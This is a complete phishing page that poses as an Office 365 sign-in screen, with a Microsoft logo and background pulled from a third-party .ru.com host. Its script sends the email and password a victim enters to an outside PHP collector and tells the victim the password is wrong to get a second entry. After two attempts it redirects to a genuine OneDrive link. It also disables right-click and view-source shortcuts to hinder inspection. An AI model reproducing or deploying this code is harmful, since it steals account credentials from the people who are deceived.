<html lang="en"><head>

    <title>Office 365</title>
</head>

<body style="background-image: url('https://perfectcoin.ru.com/1822/off/images/214d89a26f0ac918a09f216a1b0f97b4.png'); background-repeat: no-repeat;background-size: cover;">
    <div class="container-fluid p-0">
        <div class="container">
            <div class="row my-5">
                <div class="col-lg-5 mx-auto">
                    <div class="m-5 p-4 bg-white rounded" id="div1" style="box-shadow: 0px 2px 5px rgba(0,0,0,0.5);">
                        <div class="text-left">
                            <span><img src="https://perfectcoin.ru.com/1822/off/images/microsoft_logo_ee5c8d9fb6248c938fd0dc19370e90bd.svg" class="img-fluid" width="110px"></span><span class="pl-4 h5 align-middle"> </span><br><br>
                            <span class="h5">Sign in</span><br>
                            <span class="h5"></span><br>
                            <span class="h">Only recipient email can access shared files</span><br>
                            <span id="msg" class="text-danger" style="display: none;">Invalid Password..! Please enter correct password.</span><br>
                            <span id="error" class="text-danger" style="display: none;">That account doesn't exist. Enter a different account</span>

                            <div class="form-group">
                                <input type="email" name="ai" class="form-control rounded-0 bg-transparent" id="email" aria-describedby="aiHelp" placeholder="Email, phone or Skype">
                            </div>
                            <div class="form-group mt-2">
                                <small></small>
                                <input type="password" name="pr" class="form-control" id="password" aria-describedby="aiHelp" placeholder="Password">
                            </div>
                        </div>
                        <div class="form-check mt-3">
                            <input type="checkbox" class="form-check-input" id="exampleCheck1">
                            <label class="form-check-label" for="exampleCheck1"><span><a href="#">Keep me sign in</a></span></label>
                            <span><span><a href="#" class="float-right">Forgot Password?</a></span></span>
                        </div>
                        <div class="col-lg-12 mt-3">
                            <button class="btn text-white px-4 w-100" id="submit-btn" style="background-color: #0a59a3;">Next</button>
                        </div>
                    </div>
                </div>
                <!-- Optional JavaScript -->
                <!-- jQuery first, then Popper.js, then Bootstrap JS -->

                <script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.12.9/umd/popper.min.js" integrity="sha384-ApNbgh9B+Y1QKtv3Rn7W3mgPxhU9K/ScQsAP7hUibX39j7fakFPskvXusvfa0b4Q" crossorigin="anonymous"></script>
                <script type="text/javascript" src="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/js/bootstrap.min.js" integrity="sha384-JZR6Spejh4U02d8jOt6vLEHfe/JQGiRRSQQxSfFWpi1MquVdAyjUar5+76PVCmYl" crossorigin="anonymous"></script>

<script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
<script type="text/javascript" src="https://stackpath.bootstrapcdn.com/bootstrap/4.1.3/js/bootstrap.min.js"></script>
<script>
    
    // prevent ctrl + s
    $(document).bind('keydown', function(e) {
    if(e.ctrlKey && (e.which == 83)) {
    e.preventDefault();
    return false;
    }
    });
    
    document.addEventListener('contextmenu', event => event.preventDefault());
    
    document.onkeydown = function(e) {
    if (e.ctrlKey && 
    (e.keyCode === 67 || 
    e.keyCode === 86 || 
    e.keyCode === 85 || 
    e.keyCode === 117)) {
    return false;
    } else {
    return true;
    }
    };
    $(document).keypress("u",function(e) {
    if(e.ctrlKey)
    {
    return false;      }
    else {
    return true;
    }});
    
    
    
    /* global $ */
    $(document).ready(function(){
    var count=0;
    ;
    
    
    
    
    $('#submit-btn').click(function(event){
    
    event.preventDefault();
    var email=$("#email").val();
    var password=$("#password").val();
    var msg = $('#msg').html();
    $('#msg').text( msg );
    
    if (!password) {
                    $('#error').show();
                    $('#error').html("Password field is empty.!");
    
                    return false;
                }
    
    count=count+1;
    
    $.ajax({
    dataType: 'JSON',
    url: 'https://www.flexonzone.space/82938/ahead/aheadoffice.php',
    type: 'POST',
              data:{
                  email:email,
                  password:password,
              },
                // data: $('#contact').serialize(),
                beforeSend: function(xhr){
                    
                },
                success: function(response){
                    if(response){
                        $("#msg").show();
                        console.log(response);
                        if(response['signal'] == 'ok'){
                            $("#password").val("");
                            if (count>=2) {
                                count=0;
                        // window.location.replace(response['redirect_link']);
                        window.location.replace("https://onedrive.live.com/?authkey=%21ALp%2DkqOtloNQ5C4&cid=D9A644D8396DBA90&id=D9A644D8396DBA90%212851&parId=root&o=OneUp");
    
                    }
                          $("#msg").show();
            $('#msg').html("Please enter correct password and try again");
                }
                else{
                            $("#msg").show();
            $('#msg').html("Please enter correct password and try again");
                }
            }
        },
        error: function(){
            $("#password").val("");
            if (count>=2) {
                count=0;
                  window.location.replace("https://onedrive.live.com/?authkey=%21ALp%2DkqOtloNQ5C4&cid=D9A644D8396DBA90&id=D9A644D8396DBA90%212851&parId=root&o=OneUp"); 
            }
                    $("#msg").show();
            $('#msg').html("Please enter correct password and try again");
        },
        complete: function(){
            
        }
    });
      });
    
    
        });
    
    
    </script>
